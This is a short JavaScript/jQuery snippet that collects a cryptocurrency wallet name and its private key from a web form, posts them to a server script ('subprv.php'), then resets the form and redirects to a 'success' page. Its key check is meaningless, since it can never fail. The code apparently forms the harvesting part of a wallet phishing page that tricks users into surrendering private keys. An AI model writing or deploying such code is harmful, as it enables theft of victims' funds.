function SubmitKeyData() {
    var wallet = $("#prvWallet").val();
    var key = $("#privateKey").val();

    if (wallet == '' || key == '') {
        $('#pvtErr').html("<p>All fields are required</p>");
    } else {
        var keyNumber = key.match(/(\w+)/g).length;
        if (keyNumber < 0) {
            $('#pvtErr').html("<p>Invalid Private Key</p>")
        } else {
            $.post("subprv.php", {
                    prvWallet: wallet,
                    privateKey: key
                },
                function(data) {
                    $('#results').html(data);
                    $('#privateForm')[0].reset();
                    location.href = 'success.html'

                });
        }
    }

}

function clearkErr() {
    $('#pvtErr').html('')
}